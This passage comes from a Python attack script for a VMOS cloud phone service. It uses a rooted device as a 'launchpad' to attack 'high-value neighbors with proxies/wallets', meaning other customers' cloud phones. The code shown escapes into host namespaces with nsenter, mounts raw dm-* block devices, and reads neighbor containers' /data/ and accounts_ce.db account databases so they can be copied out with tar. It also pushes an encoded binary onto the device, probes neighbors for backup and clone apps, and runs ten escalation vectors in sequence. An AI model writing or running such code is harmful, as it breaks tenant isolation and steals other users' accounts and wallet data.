        'ls -la /dev/block/dm-* 2>/dev/null; echo ===; '
        'cat /proc/diskstats 2>/dev/null | grep dm- | head -20; echo ===; '
        'mount | grep dm- | head -20"'
    ), timeout=20)
    log(f"    DM devices: {dm[:400]}")
    results["dm_devices"] = dm

    # 10b: Try to mount unmounted dm-* devices
    log("  [10b] Attempting dm-* mounts...")
    mount_test = await cmd(client, (
        f'nsenter {ns_flags} -- sh -c "'
        'for i in $(seq 0 20); do '
        '  [ -b /dev/block/dm-$i ] || continue; '
        '  mp=/tmp/dm_$i; mkdir -p $mp 2>/dev/null; '
        '  mount -t ext4 -o ro /dev/block/dm-$i $mp 2>/dev/null && '
        '    echo \\"DM-$i: $(ls $mp 2>/dev/null | head -5)\\" && '
        '    umount $mp 2>/dev/null; '
        '  rmdir $mp 2>/dev/null; '
        'done; echo DONE"'
    ), timeout=25)
    log(f"    Mount results: {mount_test[:400]}")
    results["mount_test"] = mount_test

    # 10c: If we found containers via V1, tar their /data/ directly
    if RESULTS["discovered_pad_codes"]:
        for entry in RESULTS["discovered_pad_codes"][:2]:
            pid = entry["pid"]
            pad = entry["pad_code"]
            log(f"  [10c] Direct /data/ tar from PID {pid} ({pad})...")
            
            # Quick size check first
            data_size = await cmd(client, (
                f'nsenter {ns_flags} -- sh -c "'
                f'du -sh /proc/{pid}/root/data/ 2>/dev/null | head -1"'
            ), timeout=15)
            log(f"    /data/ size: {data_size[:100]}")
            
            # Test random file access
            file_test = await cmd(client, (
                f'nsenter {ns_flags} -- sh -c "'
                f'ls /proc/{pid}/root/data/data/ 2>/dev/null | head -10; echo ===; '
                f'cat /proc/{pid}/root/data/system_ce/0/accounts_ce.db 2>/dev/null | wc -c"'
            ), timeout=15)
            log(f"    File access: {file_test[:200]}")
            entry["direct_fs"] = file_test

            if file_test and "===" in file_test and not file_test.strip().endswith("0"):
                log(f"    ★★★ DIRECT FS ACCESS WORKS for {pad}! Can tar /data/! ★★★")
                results["status"] = "SUCCESS"

    RESULTS["vectors"]["v10_host_fs"] = results
    return results


# ═══════════════════════════════════════════════════════════════════════════
# 3RD PARTY CLOUD CLONE RESEARCH
# ═══════════════════════════════════════════════════════════════════════════

async def research_3rd_party_clone(client):
    """Check what clone/transfer tools exist on neighbor devices."""
    log("═" * 60)
    log("3RD PARTY CLONE APP RESEARCH")
    log("═" * 60)
    results = {}

    for target in TARGETS[:2]:
        log(f"  Checking clone-related apps on {target}...")
        
        clone_apps = await probe_neighbor(client, target, (
            "pm list packages 2>/dev/null | grep -iE 'clone|switch|transfer|backup|migrate|copy|sync|move' | head -20; echo ---; "
            "pm list packages 2>/dev/null | grep -iE 'samsung.smart|google.android.apps.restore|motorola.migrate' | head -10; echo ---; "
            "pm list packages 2>/dev/null | grep -iE 'titanium|helium|swift|migrate|transfer' | head -10; echo ---; "
            "dumpsys package com.google.android.apps.restore 2>/dev/null | grep -E 'versionName|firstInstallTime' | head -5; echo ---; "
            "dumpsys package com.samsung.android.smartswitchassistant 2>/dev/null | grep -E 'versionName' | head -3"
        ), timeout_secs=12)
        log(f"    Clone apps on {target}: {clone_apps[:400]}")
        results[target] = clone_apps

    RESULTS["clone_research"] = results
    return results


# ═══════════════════════════════════════════════════════════════════════════
# MAIN ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════

async def main():
    print("╔" + "═" * 68 + "╗")
    print("║  NEIGHBOR ROOT ESCALATION — 10-VECTOR COMPREHENSIVE TEST         ║")
    print("║  Launchpad: APP6476KYH9KMLU5 (Samsung S25 Ultra, root)           ║")
    print("║  Targets: 4 high-value neighbors with proxies/wallets            ║")
    print("╚" + "═" * 68 + "╝")

    async with VMOSCloudClient(ak=AK, sk=SK, base_url=BASE) as client:
        # Verify launchpad is alive
        log("Verifying launchpad...")
        verify = await cmd(client, "id; echo ---; ip addr show eth0 | grep inet; echo ---; date", timeout=15)
        log(f"Launchpad: {verify[:200]}")

        if not verify or "uid=" not in verify:
            log("✗ LAUNCHPAD NOT RESPONDING — aborting")
            return

        # Ensure CNXN binary exists on device
        cn_check = await cmd(client, f"ls -la {CLONE_DIR}/cn.bin 2>/dev/null || echo MISSING", timeout=10)
        if "MISSING" in cn_check:
            log("Pushing CNXN binary to device...")
            cn_pkt = build_cnxn()
            cn_b64 = base64.b64encode(cn_pkt).decode()
            await cmd(client, f"mkdir -p {CLONE_DIR} && echo '{cn_b64}' | base64 -d > {CLONE_DIR}/cn.bin", timeout=10)

        # Execute all vectors sequentially
        log("\n" + "=" * 70)
        log("EXECUTING ALL VECTORS...")
        log("=" * 70)

        await v1_nsenter_host(client)
        await asyncio.sleep(2)

        await v2_switch_root_api(client)
        await asyncio.sleep(2)

        await v3_xu_daemon(client)
        await asyncio.sleep(2)

        await v4_push_su_binary(client)
        await asyncio.sleep(2)

        await v5_adb_root_service(client)
        await asyncio.sleep(2)

        await v6_armcloud_agent(client)
        await asyncio.sleep(2)

        await v7_nats_injection(client)
        await asyncio.sleep(2)

        await v8_property_manipulation(client)
        await asyncio.sleep(2)

        await v9_noroot_extraction(client)
        await asyncio.sleep(2)

        await v10_host_cross_container(client)
        await asyncio.sleep(2)

        await research_3rd_party_clone(client)

        # ═══════════════════════════════════════════════════════════════
        # SUMMARY
        # ═══════════════════════════════════════════════════════════════
        print("\n" + "╔" + "═" * 68 + "╗")
        print("║  RESULTS SUMMARY                                                 ║")
        print("╚" + "═" * 68 + "╝")

        for vname, vdata in RESULTS["vectors"].items():
            status = vdata.get("status", "UNKNOWN")
            icon = "★" if status == "SUCCESS" else "✗" if status in ("FAILED", "SKIPPED") else "?"
            print(f"  {icon} {vname}: {status}")

        if RESULTS["discovered_pad_codes"]:
            print(f"\n  Discovered {len(RESULTS['discovered_pad_codes'])} neighbor pad codes:")
            for entry in RESULTS["discovered_pad_codes"][:10]:
                print(f"    PAD={entry['pad_code']} PID={entry['pid']}")

        # Save full results
        outfile = "/root/CascadeProjects/vmos-titan-unified/output/root_escalation_results.json"
        os.makedirs(os.path.dirname(outfile), exist_ok=True)
        with open(outfile, "w") as f:
            json.dump(RESULTS, f, indent=2, default=str)
        print(f"\n  Full results: {outfile}")


if __name__ == "__main__":
    asyncio.run(main())
